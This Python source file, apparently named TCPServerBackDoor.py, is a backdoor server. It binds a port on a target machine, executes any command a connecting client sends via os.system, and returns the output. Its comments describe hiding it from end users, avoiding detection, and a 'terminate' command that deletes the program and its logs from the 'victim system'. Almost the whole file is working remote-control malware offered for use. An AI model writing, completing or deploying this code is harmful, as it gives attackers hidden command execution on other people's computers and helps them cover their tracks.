import socket #This allows us to create socckets and various network protcol data communications
import os #This lets us initiate functions on the operating system kernel  
import sys #This lets us initiate 
import random #This will allow us to randmize our port that is being assigned to the server THIS SI GOOD FOR TESTING IT

#ANYTHING THAT SAYS IT CAN BE COMMENTED OUT IS JUST FOR DEBUGGING AND TESTING PURPOSES WITH NETCAT AND THE CLIENT APPLICATION BEFORE IT IS USED IN A REAL ENVIORNMENT

#THE SERVER NEEDS TO RUN IN THE MAIN BACKGROUND ON THE END USERS SYSTEM WITHOUT THE MAIN ICON SHOWING UP ON IT

#We also need to figure out how to make the server smarter to tell the differnce between more than one type of client connection on a network

os.system("clear")

ip = "" #This is a static IP address we can use if we want to configure the main server with  
port = 8 #If you are running this on your own system and need it to clear the ip and port just run "nmap localhost" in your linux terminal and it will clear it up by forcing it into an ignored/closed state
#port = randomint(0, 10) #This willa ssigna  random int value for our port value from 1 to 10 
address = (ip, port)

#This sets up the main server side socket information
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(address) #This will bind a listening port and IP address on the main target system
server.listen(10) #This is going to allow our server to listen for a maximum of 10 connections at a time

#def listen(): #This is going to put the server into a listening state where it will wait for connections (THIS IS GOING TO LATER BE UPGRADED TO HANDLE MORE THAN ONE TYPE OF CONNECTION)
while True:

    #The server will listen for any and all connections, and handle them, along with any responses needed to be sent to client systems to confirm the connction handshake
    print("Server in listening state on PORT => ", port)
    connection, client_addr = server.accept() 

    #Once it accepts a connection, it will print the contents to us in the terminal. as well as to a main log file that we canr efernce (COMMENT THIS OUT TO AVOID GIVING AWAY IP INFROMATION)
    print("CONECTION RECIEVED FROM => ", client_addr)
    print(str(client_addr))

    #This will parse and pipe in a command to the python3 interpreter to execute a log script we are runnning to keep track of who connects to the server (COMMENT THIS OUT TO AVOID DETECTION)
    echocommand = "echo ' " + str(client_addr) + " ' | python3 LogScript.py" #You can nest single quotes to wrap around inside concated strings to format and handle the data properlly
    os.system(echocommand)

    #The server will ping back the client a message to the client system connected indicating and completing the handshake 
    response = "You are connected to " + ip + str(port)
    responsedata = response.encode('UTF-8') 
    connection.sendall(responsedata) #Critical that we use the "connection" variable that is handling first elements from the "server.accept()" function call to send data. 
                                     #YOU CANNOT SEND DATA WITH A SOCKET THAT IS ALREADY IN A LISTENING STATE OTHERWISE IT WILL CASUE A BROKEN PIPE ERROR TO OCCUR
    break 
   


#def wait_for_data(): #This while loop is going to have th eserver sit and wait for data from the main client that is connected to the server (THIS ALSO NEEDS TO BE APART OF A THREAD EVENTUALLY)
while True:

    print("Waiting for Data from the Client")
    data = connection.recv(7000) 

    if data: #If the server recieves any data, it will unwrwap and run the command on the victim system hosting the server

        #This will convert the command to a string format and then pass it to the system to execute
        tcphandler = data.decode('UTF-8')
        print(tcphandler) #The command will print to the main system (THIS CAN BE COMMENTED OUT)

        #This command will have the program wipe itself from the system, all data, and will terminate the main connection
        if tcphandler == "terminate":
            
            #def clean_up(): This will clean up the main programs excess files: logs, text files, etc
            os.system("rm LogScript.py")
            os.system("rm anonymous.txt")
            os.system("rm LogData.txt")
            os.system("rm TCPServerBackDoor.py")
            server.close() #This will 
            exit() #This is going to close the main server side connecton so it can't recieve anymore requests to it 

        #We might have to use the exact same pipe commadn in order to get it to work for the same area here 
        syscommand = tcphandler + " > anonymous.txt" #The output here is going to a file!!! that's why I can't seee it ONCE WE FIX 
        os.system(syscommand)

            
        #Next we need to open the file in the current location and then have it's contents sent back to the client in binary format so we can see the main output of the command from our end
        results = open("anonymous.txt", "r") #This is going to open the file for it to be read the file in string format
        resultsdata = results.read() #The data will be read in full here
        commanddata = resultsdata.encode('UTF-8') #Then it wil all be encoded into binary format to be transmitted tot he client system
        connection.sendall(commanddata) #Data is being sent here
                                    #THIS FUNCTION IS CAUSING THE CONNECTION TO FAIL
        
        